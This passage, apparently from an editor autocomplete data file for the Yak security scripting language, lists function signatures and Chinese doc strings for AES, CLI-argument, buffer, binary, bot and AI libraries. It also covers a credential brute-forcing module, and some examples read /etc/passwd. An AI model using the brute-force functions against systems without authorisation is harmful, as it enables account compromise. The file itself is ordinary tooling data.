              "AESECBEncryptWithPKCS7Padding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESECBEncryptWithPKCS7Padding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESECBEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESECBEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESECBDecryptWithZeroPadding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESECBDecryptWithZeroPadding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESECBDecryptWithPKCS7Padding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESECBDecryptWithPKCS7Padding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESECBDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESECBDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESCBCEncryptWithZeroPadding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESCBCEncryptWithZeroPadding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESCBCEncryptWithPKCS7Padding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESCBCEncryptWithPKCS7Padding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESCBCEncrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESCBCEncrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESCBCDecryptWithZeroPadding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESCBCDecryptWithZeroPadding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESCBCDecryptWithPKCS7Padding(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESCBCDecryptWithPKCS7Padding(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
          {
            functionName:
              "AESCBCDecrypt(${1:key /*type: []byte*/}, ${2:i}, ${3:iv /*type: []byte*/})",
            document: "",
            definitionStr:
              "AESCBCDecrypt(key []byte, i any, iv []byte) ([]byte any, error any)",
          },
        ],
      },
      {
        libName: "cli",
        prefix: "cli.",
        functions: [
          {
            functionName: "whenTrue(${1:param /*type: string*/})",
            document: "",
            definitionStr: "whenTrue(param string) UIParams",
          },
          {
            functionName:
              "whenNotEqual(${1:param /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr: "whenNotEqual(param string, value string) UIParams",
          },
          {
            functionName: "whenFalse(${1:param /*type: string*/})",
            document: "",
            definitionStr: "whenFalse(param string) UIParams",
          },
          {
            functionName:
              "whenEqual(${1:param /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr: "whenEqual(param string, value string) UIParams",
          },
          {
            functionName: "whenDefault()",
            document: "",
            definitionStr: "whenDefault() UIParams",
          },
          {
            functionName: "when(${1:expression /*type: string*/})",
            document: "",
            definitionStr: "when(expression string) UIParams",
          },
          {
            functionName: "showParams(${1:params...})",
            document: "",
            definitionStr: "showParams(params ...string) UIParams",
          },
          {
            functionName: "showGroup(${1:group /*type: string*/})",
            document: "",
            definitionStr: "showGroup(group string) UIParams",
          },
          {
            functionName: "setVerboseName(${1:verboseName /*type: string*/})",
            document: "",
            definitionStr:
              'setVerboseName(verboseName string) SetCliExtraParam  doc:setVerboseName 是一个选项函数，设置参数的中文名\nExample:\n```\ncli.String("target", cli.setVerboseName("目标"))\n```',
          },
          {
            functionName: "setShortName(${1:shortName /*type: string*/})",
            document: "",
            definitionStr:
              'setShortName(shortName string) SetCliExtraParam  doc:setShortName 是一个选项函数，设置参数的短名称\nExample:\n```\ncli.String("target", cli.setShortName("t"))\n```\n在命令行可以使用`-t`代替`--target`',
          },
          {
            functionName:
              "setSelectOption(${1:name /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'setSelectOption(name string, value string) SetCliExtraParam  doc:setSelectOption 是一个选项函数，设置参数的下拉框选项\n此选项仅在`cli.StringSlice`中生效\nExample:\n```\ncli.StringSlice("targets", cli.setSelectOption("下拉框选项", "下拉框值"))\n```',
          },
          {
            functionName: "setRequired(${1:t /*type: bool*/})",
            document: "",
            definitionStr:
              'setRequired(t bool) SetCliExtraParam  doc:setRequired 是一个选项函数，设置参数是否必须\nExample:\n```\ncli.String("target", cli.SetRequired(true))\n```',
          },
          {
            functionName: "setMultipleSelect(${1:multiSelect /*type: bool*/})",
            document: "",
            definitionStr:
              'setMultipleSelect(multiSelect bool) SetCliExtraParam  doc:SetMultipleSelect 是一个选项函数，设置参数是否可以多选\n此选项仅在`cli.StringSlice`中生效\nExample:\n```\ncli.StringSlice("targets", cli.SetMultipleSelect(true))\n```',
          },
          {
            functionName: "setHelp(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'setHelp(i string) SetCliExtraParam  doc:setHelp 是一个选项函数，设置参数的帮助信息\n这会在命令行输入 --help 或执行`cli.check()`后参数非法时显示\nExample:\n```\ncli.String("target", cli.SetHelp("target host or ip"))\n```',
          },
          {
            functionName: "setDefault(${1:i})",
            document: "",
            definitionStr:
              'setDefault(i any) SetCliExtraParam  doc:setDefault 是一个选项函数，设置参数的默认值\nExample:\n```\ncli.String("target", cli.SetDefault("yaklang.com"))\n```',
          },
          {
            functionName: "setCliGroup(${1:group /*type: string*/})",
            document: "",
            definitionStr:
              'setCliGroup(group string) SetCliExtraParam  doc:setCliGroup 是一个选项函数，设置参数的分组\nExample:\n```\ncli.String("target", cli.setCliGroup("common"))\ncli.Int("port", cli.setCliGroup("common"))\ncli.Int("threads", cli.setCliGroup("request"))\ncli.Int("retryTimes", cli.setCliGroup("request"))\n```',
          },
          {
            functionName: "hideParams(${1:params...})",
            document: "",
            definitionStr: "hideParams(params ...string) UIParams",
          },
          {
            functionName: "hideGroup(${1:group /*type: string*/})",
            document: "",
            definitionStr: "hideGroup(group string) UIParams",
          },
          {
            functionName: "help(${1:w...})",
            document: "",
            definitionStr:
              "help(w ...io.Writer)  doc:help 用于输出命令行程序的帮助信息\nExample:\n```\ncli.help()\n```",
          },
          {
            functionName: "check()",
            document: "",
            definitionStr:
              'check()  doc:check 用于检查命令行参数是否合法，这主要检查必要参数是否传入与传入值是否合法\nExample:\n```\ntarget = cli.String("target", cli.SetRequired(true))\ncli.check()\n```',
          },
          {
            functionName: "YakitPlugin(${1:options...})",
            document: "",
            definitionStr:
              'YakitPlugin(options ...SetCliExtraParam) []string  doc:YakitPlugin 获取名称为 yakit-plugin-file 的命令行参数\n根据其传入的值读取其对应文件内容并根据"|"切割并返回 []string 类型，表示各个插件名\nExample:\n```\nplugins = cli.YakitPlugin()\n// --yakit-plugin-file plugins.txt 则 plugins 为 plugins.txt 文件中的各个插件名\n```',
          },
          {
            functionName: "YakCode(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'YakCode(name string, opts ...SetCliExtraParam) string  doc:YakCode 获取对应名称的命令行参数，并将其转换为 string 类型返回\n其作为一个独立脚本运行时与 cli.String 没有区别，仅在 Yakit 图形化中展示为 Yak 代码形式\nExample:\n```\ntarget = cli.YakCode("target") // --target yaklang.com 则 target 为 yaklang.com\n```',
          },
          {
            functionName: "Urls(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Urls(name string, opts ...SetCliExtraParam) []string  doc:Urls 获取对应名称的命令行参数，根据","切割并尝试将其转换为符合URL格式并返回 []string 类型\nExample:\n```\nurls = cli.Urls("urls")\n// --urls yaklang.com:443,google.com:443 则 urls 为 ["https://yaklang.com", "https://google.com"]\n```',
          },
          {
            functionName: "Url(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Url(name string, opts ...SetCliExtraParam) []string  doc:Url 获取对应名称的命令行参数，根据","切割并尝试将其转换为符合URL格式并返回 []string 类型\nExample:\n```\nurls = cli.Url("urls")\n// --urls yaklang.com:443,google.com:443 则 urls 为 ["https://yaklang.com", "https://google.com"]\n```',
          },
          {
            functionName: "UI(${1:opts...})",
            document: "",
            definitionStr: "UI(opts ...UIParams)",
          },
          {
            functionName: "Text(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Text(name string, opts ...SetCliExtraParam) string  doc:Text 获取对应名称的命令行参数，并将其转换为 string 类型返回\n其作为一个独立脚本运行时与 cli.String 没有区别，仅在 Yakit 图形化中展示为文本框形式\nExample:\n```\ntarget = cli.Text("target") // --target yaklang.com 则 target 为 yaklang.com\n```',
          },
          {
            functionName:
              "StringSlice(${1:name /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'StringSlice(name string, options ...SetCliExtraParam) []string  doc:StringSlice 获取对应名称的命令行参数，将其字符串根据","切割返回 []string 类型\nExample:\n```\ntargets = cli.StringSlice("targets")\n// --targets yaklang.com,google.com 则 targets 为 ["yaklang.com", "google.com"]\n```',
          },
          {
            functionName: "String(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'String(name string, opts ...SetCliExtraParam) string  doc:String 获取对应名称的命令行参数，并将其转换为 string 类型返回\nExample:\n```\ntarget = cli.String("target") // --target yaklang.com 则 target 为 yaklang.com\n```',
          },
          {
            functionName: "SetDoc(${1:document /*type: string*/})",
            document: "",
            definitionStr:
              'SetDoc(document string)  doc:SetDoc 设置此命令行程序的文档\n这会在命令行输入 --help 或执行`cli.check()`后参数非法时显示\nExample:\n```\ncli.SetDoc("example-tools is a tool for example")\n```',
          },
          {
            functionName: "SetCliName(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'SetCliName(name string)  doc:SetCliName 设置此命令行程序的名称\n这会在命令行输入 --help 或执行`cli.check()`后参数非法时显示\nExample:\n```\ncli.SetCliName("example-tools")\n```',
          },
          {
            functionName: "Ports(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Ports(name string, opts ...SetCliExtraParam) []int  doc:Ports 获取对应名称的命令行参数，根据","与"-"切割并尝试解析端口并返回 []int 类型\nExample:\n```\nports = cli.Ports("ports")\n// --ports 10086-10088,23333 则 ports 为 [10086, 10087, 10088, 23333]\n```',
          },
          {
            functionName: "Port(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Port(name string, opts ...SetCliExtraParam) []int  doc:Port 获取对应名称的命令行参数，根据","与"-"切割并尝试解析端口并返回 []int 类型\nExample:\n```\nports = cli.Port("ports")\n// --ports 10086-10088,23333 则 ports 为 [10086, 10087, 10088, 23333]\n```',
          },
          {
            functionName: "Network(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Network(name string, opts ...SetCliExtraParam) []string  doc:NetWork 获取对应名称的命令行参数，根据","切割并尝试解析CIDR网段并返回 []string 类型\nExample:\n```\nhosts = cli.NetWork("hosts")\n// --hosts 192.168.0.0/24,172.17.0.1 则 hosts 为 192.168.0.0/24对应的所有IP和172.17.0.1\n```',
          },
          {
            functionName: "Net(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Net(name string, opts ...SetCliExtraParam) []string  doc:Net 获取对应名称的命令行参数，根据","切割并尝试解析CIDR网段并返回 []string 类型\nExample:\n```\nhosts = cli.Net("hosts")\n// --hosts 192.168.0.0/24,172.17.0.1 则 hosts 为 192.168.0.0/24对应的所有IP和172.17.0.1\n```',
          },
          {
            functionName: "LineDict(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'LineDict(name string, opts ...SetCliExtraParam) []string  doc:LineDict 获取对应名称的命令行参数\n根据其传入的值尝试读取其对应文件内容，如果无法读取则作为字符串，最后根据换行符切割，返回 []string 类型\nExample:\n```\ndict = cli.LineDict("dict")\n// --dict /etc/passwd 则 dict 为 /etc/passwd 文件中的逐行的内容\n// --dict "asd" 则 dict 为 ["asd"]\n```',
          },
          {
            functionName: "Integer(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Integer(name string, opts ...SetCliExtraParam) int  doc:Integer 获取对应名称的命令行参数，并将其转换为 int 类型返回\nExample:\n```\nport = cli.Integer("port") // --port 80 则 port 为 80\n```',
          },
          {
            functionName: "Int(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Int(name string, opts ...SetCliExtraParam) int  doc:Int 获取对应名称的命令行参数，并将其转换为 int 类型返回\nExample:\n```\nport = cli.Int("port") // --port 80 则 port 为 80\n```',
          },
          {
            functionName: "Hosts(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Hosts(name string, opts ...SetCliExtraParam) []string  doc:Hosts 获取对应名称的命令行参数，根据","切割并尝试解析CIDR网段并返回 []string 类型\nExample:\n```\nhosts = cli.Hosts("hosts")\n// --hosts 192.168.0.0/24,172.17.0.1 则 hosts 为 192.168.0.0/24对应的所有IP和172.17.0.1\n```',
          },
          {
            functionName: "Host(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Host(name string, opts ...SetCliExtraParam) []string  doc:Host 获取对应名称的命令行参数，根据","切割并尝试解析CIDR网段并返回 []string 类型\nExample:\n```\nhosts = cli.Host("hosts")\n// --hosts 192.168.0.0/24,172.17.0.1 则 hosts 为 192.168.0.0/24对应的所有IP和172.17.0.1\n```',
          },
          {
            functionName: "Have(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Have(name string, opts ...SetCliExtraParam) bool  doc:Have 获取对应名称的命令行参数，并将其转换为 bool 类型返回\nExample:\n```\nverbose = cli.Have("verbose") // --verbose 则为true\n```',
          },
          {
            functionName: "HTTPPacket(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'HTTPPacket(name string, opts ...SetCliExtraParam) string  doc:HTTPPacket 获取对应名称的命令行参数，并将其转换为 string 类型返回\n其作为一个独立脚本运行时与 cli.String 没有区别，仅在 Yakit 图形化中展示为 HTTP 报文形式\nExample:\n```\ntarget = cli.HTTPPacket("target") // --target yaklang.com 则 target 为 yaklang.com\n```',
          },
          {
            functionName: "FolderName(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'FolderName(name string, opts ...SetCliExtraParam) string  doc:FolderName 获取对应名称的命令行参数，获得选中的文件夹路径，并返回 string 类型\nExample:\n```\nfolder = cli.FolderName("folder")\n// --folder /etc 则 folder 为 "/etc"\n```',
          },
          {
            functionName: "Float(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Float(name string, opts ...SetCliExtraParam) float64  doc:Float 获取对应名称的命令行参数，并将其转换为 float 类型返回\nExample:\n```\npercent = cli.Float("percent") // --percent 0.5 则 percent 为 0.5\n```',
          },
          {
            functionName:
              "FileOrContent(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'FileOrContent(name string, opts ...SetCliExtraParam) []byte  doc:FileOrContent 获取对应名称的命令行参数\n根据其传入的值尝试读取其对应文件内容，如果无法读取则直接返回，最后返回 []byte 类型\nExample:\n```\nfoc = cli.FileOrContent("foc")\n// --foc /etc/passwd 则 foc 为 /etc/passwd 文件中的内容\n// --file "asd" 则 file 为 "asd"\n```',
          },
          {
            functionName: "FileNames(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'FileNames(name string, opts ...SetCliExtraParam) []string  doc:FileNames 获取对应名称的命令行参数，获得选中的所有文件路径，并返回 []string 类型\nExample:\n```\nfile = cli.FileNames("file")\n// --file /etc/passwd,/etc/hosts 则 file 为 ["/etc/passwd", "/etc/hosts"]\n```',
          },
          {
            functionName: "File(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'File(name string, opts ...SetCliExtraParam) []byte  doc:File 获取对应名称的命令行参数，根据其传入的值读取其对应文件内容并返回 []byte 类型\nExample:\n```\nfile = cli.File("file")\n// --file /etc/passwd 则 file 为 /etc/passwd 文件中的内容\n```',
          },
          {
            functionName: "Double(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Double(name string, opts ...SetCliExtraParam) float64  doc:Double 获取对应名称的命令行参数，并将其转换为 float 类型返回\nExample:\n```\npercent = cli.Double("percent") // --percent 0.5 则 percent 为 0.5\n```',
          },
          {
            functionName: "Bool(${1:name /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Bool(name string, opts ...SetCliExtraParam) bool  doc:Bool 获取对应名称的命令行参数，并将其转换为 bool 类型返回\nExample:\n```\nverbose = cli.Bool("verbose") // --verbose 则为true\n```',
          },
          {
            functionName: "Args()",
            document: "",
            definitionStr: "Args() []string",
          },
        ],
      },
      {
        libName: "bufio",
        prefix: "bufio.",
        functions: [
          {
            functionName: "NewWriterSize(${1:i}, ${2:size /*type: int*/})",
            document: "",
            definitionStr:
              'NewWriterSize(i any, size int) (*bufio.Writer, error)  doc:NewWriterSize 根据传入的 Writer 创建一个新的 BufioWriter 结构体引用，其的缓存大小为 size\n\n常用的 BufioWriter 方法有：Write, WriteByte, WriteString, Reset, Flush\n\nExample:\n```\nwriter, err = bufio.NewWriterSize(os.Stdout, 1024)\nwriter.WriteString("hello yak")\nwriter.Flush()\n```\n',
          },
          {
            functionName: "NewWriter(${1:raw...})",
            document: "",
            definitionStr:
              'NewWriter(raw ...any) (*bufio.Writer, error)  doc:NewWriter 根据传入的 Writer 创建一个新的 BufioWriter 结构体引用\n\n常用的 BufioWriter 方法有：Write, WriteByte, WriteString, Reset, Flush\n\nExample:\n```\nwriter, err = bufio.NewWriter(os.Stdout)\nwriter.WriteString("hello yak")\nwriter.Flush()\n```\n',
          },
          {
            functionName: "NewScanner(${1:i})",
            document: "",
            definitionStr:
              'NewScanner(i any) (*bufio.Scanner, error)  doc:NewScanner 根据传入的 Reader 创建一个新的 Scanner 结构体引用\n\n常用的 Scanner 方法有：Scan, Text, Err, Split, SplitFunc\n\nExample:\n```\nbuf = bufio.NewBuffer("hello yak\\nhello yakit")\nscanner, err = bufio.NewScanner(buf)\nfor scanner.Scan() {\nprintln(scanner.Text())\n}\n```\n',
          },
          {
            functionName: "NewReaderSize(${1:i}, ${2:size /*type: int*/})",
            document: "",
            definitionStr:
              "NewReaderSize(i any, size int) (*bufio.Reader, error)  doc:NewReaderSize 根据传入的 Reader 创建一个新的 BufioReader 结构体引用，其的缓存大小为 size\n\n常用的 BufioReader 方法有：Read, ReadByte, ReadBytes, ReadLine, ReadString, Reset\n\nExample:\n```\nreader = bufio.NewReaderSize(os.Stdin, 1024)\n```\n",
          },
          {
            functionName: "NewReader(${1:raw...})",
            document: "",
            definitionStr:
              "NewReader(raw ...any) (*bufio.Reader, error)  doc:NewReader 根据传入的 Reader 创建一个新的 BufioReader 结构体引用\n\n常用的 BufioReader 方法有：Read, ReadByte, ReadBytes, ReadLine, ReadString, Reset\n\nExample:\n```\nreader = bufio.NewReader(os.Stdin)\n```\n",
          },
          {
            functionName: "NewReadWriter(${1:i}, ${2:i2})",
            document: "",
            definitionStr:
              "NewReadWriter(i any, i2 any) (*bufio.ReadWriter, error)  doc:NewReadWriter 根据传入的 Reader 和 Writer 创建一个新的 BufioReadWriter 结构体引用\n\nBufioReadWriter 可以同时调用 BufioReader 和 BufioWriter 的方法\n\nExample:\n```\nrw, err = bufio.NewReadWriter(os.Stdin, os.Stdout)\n```\n",
          },
          {
            functionName: "NewBuffer(${1:b...})",
            document: "",
            definitionStr:
              'NewBuffer(b ...[]byte) *bytes.Buffer  doc:NewBuffer 创建一个新的 Buffer 结构体引用，其帮助我们处理字符串\n\nBuffer 也实现了 Reader 和 Writer 接口\n\n常用的 Buffer 方法有：Bytes, String, Read, Write, WriteString, WriteByte, Reset\n\nExample:\n```\nbuffer = bufio.NewBuffer() // 或者你也可以使用 io.NewBuffer("hello yak") 来初始化一个 Buffer\nbuffer.WriteString("hello yak")\ndata, err = io.ReadAll(buffer) // data = b"hello yak", err = nil\n```\n',
          },
        ],
      },
      {
        libName: "brute",
        prefix: "brute.",
        functions: [
          {
            functionName: "userList(${1:users...})",
            document: "",
            definitionStr: "userList(users ...string) BruteOpt",
          },
          {
            functionName: "passList(${1:passes...})",
            document: "",
            definitionStr: "passList(passes ...string) BruteOpt",
          },
          {
            functionName: "okToStop(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "okToStop(b bool) BruteOpt",
          },
          {
            functionName: "minDelay(${1:min /*type: int*/})",
            document: "",
            definitionStr: "minDelay(min int) BruteOpt",
          },
          {
            functionName: "maxDelay(${1:max /*type: int*/})",
            document: "",
            definitionStr: "maxDelay(max int) BruteOpt",
          },
          {
            functionName: "finishingThreshold(${1:i /*type: int*/})",
            document: "",
            definitionStr: "finishingThreshold(i int) BruteOpt",
          },
          {
            functionName: "debug(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "debug(b bool) BruteOpt",
          },
          {
            functionName: "concurrentTarget(${1:c /*type: int*/})",
            document: "",
            definitionStr: "concurrentTarget(c int) BruteOpt",
          },
          {
            functionName: "concurrent(${1:c /*type: int*/})",
            document: "",
            definitionStr: "concurrent(c int) BruteOpt",
          },
          {
            functionName:
              "bruteHandler(${1:cb /*type: func(item *bruteutils.BruteItem) *bruteutils.BruteItemResult*/})",
            document: "",
            definitionStr:
              "bruteHandler(cb func(item *bruteutils.BruteItem) *bruteutils.BruteItemResult) BruteOpt",
          },
          {
            functionName: "autoDict()",
            document: "",
            definitionStr: "autoDict() BruteOpt",
          },
          {
            functionName: "New(${1:typeStr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "New(typeStr string, opts ...BruteOpt) (*yakBruter, error)",
          },
          {
            functionName: "GetUsernameListFromBruteType(${1:t /*type: string*/})",
            document: "",
            definitionStr: "GetUsernameListFromBruteType(t string) []string",
          },
          {
            functionName: "GetPasswordListFromBruteType(${1:t /*type: string*/})",
            document: "",
            definitionStr: "GetPasswordListFromBruteType(t string) []string",
          },
          {
            functionName: "GetAvailableBruteTypes()",
            document: "",
            definitionStr: "GetAvailableBruteTypes() []string",
          },
        ],
      },
      {
        libName: "bot",
        prefix: "bot.",
        functions: [
          {
            functionName: "workwx(${1:webhook /*type: string*/})",
            document: "",
            definitionStr: "workwx(webhook string) ConfigOpt",
          },
          {
            functionName:
              "webhookWithSecret(${1:webhook /*type: string*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              "webhookWithSecret(webhook string, key string) ConfigOpt",
          },
          {
            functionName: "webhook(${1:webhook /*type: string*/})",
            document: "",
            definitionStr: "webhook(webhook string) ConfigOpt",
          },
          {
            functionName:
              "ding(${1:webhook /*type: string*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr: "ding(webhook string, key string) ConfigOpt",
          },
          {
            functionName: "New(${1:opts...})",
            document: "",
            definitionStr: "New(opts ...ConfigOpt) *Client",
          },
          {
            functionName: "FromEnv()",
            document: "",
            definitionStr: "FromEnv() *Client",
          },
        ],
      },
      {
        libName: "bin",
        prefix: "bin.",
        functions: [
          {
            functionName: "toUint8(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toUint8(name string, values ...string) *PartDescriptor  doc:builder\n",
          },
          {
            functionName: "toUint64(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toUint64(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toUint32(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toUint32(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toUint16(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toUint16(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toUint(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toUint(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toStruct(${1:builder...})",
            document: "",
            definitionStr: "toStruct(builder ...*PartDescriptor) *PartDescriptor",
          },
          {
            functionName: "toRaw(${1:name /*type: string*/}, ${2:size})",
            document: "",
            definitionStr: "toRaw(name string, size any) *PartDescriptor",
          },
          {
            functionName: "toList(${1:builder...})",
            document: "",
            definitionStr: "toList(builder ...*PartDescriptor) *PartDescriptor",
          },
          {
            functionName: "toInt8(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toInt8(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toInt64(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toInt64(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toInt32(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toInt32(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toInt16(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr:
              "toInt16(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toInt(${1:name /*type: string*/}, ${2:values...})",
            document: "",
            definitionStr: "toInt(name string, values ...string) *PartDescriptor",
          },
          {
            functionName: "toBytes(${1:name /*type: string*/}, ${2:size})",
            document: "",
            definitionStr: "toBytes(name string, size any) *PartDescriptor",
          },
          {
            functionName: "toBool(${1:name /*type: string*/}, ${2:verbose...})",
            document: "",
            definitionStr:
              "toBool(name string, verbose ...string) *PartDescriptor",
          },
          {
            functionName: "Read(${1:data}, ${2:descriptors...})",
            document: "",
            definitionStr:
              "Read(data any, descriptors ...*PartDescriptor) ([]ResultIf any, error any)",
          },
        ],
      },
      {
        libName: "ai",
        prefix: "ai.",
        functions: [
          {
            functionName: "type(${1:t /*type: string*/})",
            document: "",
            definitionStr: "type(t string) AIConfigOption",
          },
          {
            functionName: "timeout(${1:timeout /*type: float64*/})",
            document: "",
            definitionStr: "timeout(timeout float64) AIConfigOption",
          },
          {
            functionName: "proxy(${1:p /*type: string*/})",
            document: "",
            definitionStr: "proxy(p string) AIConfigOption",
          },
          {
            functionName: "onStream(${1:h /*type: func(io.Reader)*/})",
            document: "",
            definitionStr: "onStream(h func(io.Reader)) AIConfigOption",
          },
          {
            functionName: "noHttps(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "noHttps(b bool) AIConfigOption",
          },
          {
            functionName: "model(${1:model /*type: string*/})",
            document: "",
            definitionStr: "model(model string) AIConfigOption",
          },
          {
            functionName: "funcCallRetryTimes(${1:times /*type: int*/})",
            document: "",
            definitionStr: "funcCallRetryTimes(times int) AIConfigOption",
          },
          {
            functionName: "domain(${1:domain /*type: string*/})",
            document: "",
            definitionStr: "domain(domain string) AIConfigOption",
          },
          {
            functionName: "debugStream(${1:h...})",
            document: "",
            definitionStr: "debugStream(h ...bool) AIConfigOption",
          },
          {
            functionName: "baseURL(${1:baseURL /*type: string*/})",
            document: "",
            definitionStr: "baseURL(baseURL string) AIConfigOption",
          },
          {
            functionName: "apiKey(${1:k /*type: string*/})",
            document: "",
            definitionStr: "apiKey(k string) AIConfigOption",
          },
          {
            functionName: "OpenAI(${1:opts...})",
            document: "",
            definitionStr:
              "OpenAI(opts ...aispec.AIConfigOption) aispec.AIClient",
          },
          {
            functionName: "Moonshot(${1:opts...})",
            document: "",
            definitionStr:
              "Moonshot(opts ...aispec.AIConfigOption) aispec.AIClient",
          },
          {
            functionName:
              "FunctionCall(${1:input /*type: string*/}, ${2:funcs}, ${3:opts...})",
            document: "",
            definitionStr:
              "FunctionCall(input string, funcs any, opts ...aispec.AIConfigOption) (map[string]any, error)",
          },
          {
            functionName: "ChatGLM(${1:opts...})",
            document: "",
            definitionStr:
              "ChatGLM(opts ...aispec.AIConfigOption) aispec.AIClient",
          },
          {
            functionName: "Chat(${1:msg /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Chat(msg string, opts ...aispec.AIConfigOption) (string, error)",
          },
        ],
      },
    ].reduce((acc, cur) => {
      cur.functions.forEach((func) => {
        const funcName = func.functionName.split("(")[0];
        acc.push(`${cur.libName}.${funcName}`);
      });
      return acc;
    }, []),
    globals: [
      {
        kind: 1,
        label: "yakit_status(${1:items...})",
        documentation: "yakit_status(items ...any)",
        insertText: "yakit_status(${1:items...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "yakit_save(${1:items...})",
        documentation: "yakit_save(items ...any)",
        insertText: "yakit_save(${1:items...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "yakit_output(${1:items...})",
        documentation:
          'yakit_output(items ...any)  doc:yakit_output 用于在yakit中输出日志，在非yakit的情况下它会在控制台中输出日志，在mitm插件中调用则会在被动日志中输出日志\n\nExample:\n```\nyakit_output("hello %s", "yak")\n```\n',
        insertText: "yakit_output(${1:items...})",
        insertTextRules: 4,
      },
      {
        kind: 1,
        label: "yakfmtWithError(${1:code /*type: string*/})",
        documentation:
          'yakfmtWithError(code string) (string, error)  doc:yakfmtWithError 格式化任意 Yak 代码，返回格式化后的代码和错误\nExample:\n```\nyakfmtWithError("for { println(`hello yak`) }")\n```',
        insertText: "yakfmtWithError(${1:code /*type: string*/})",
        insertTextRules: 4,
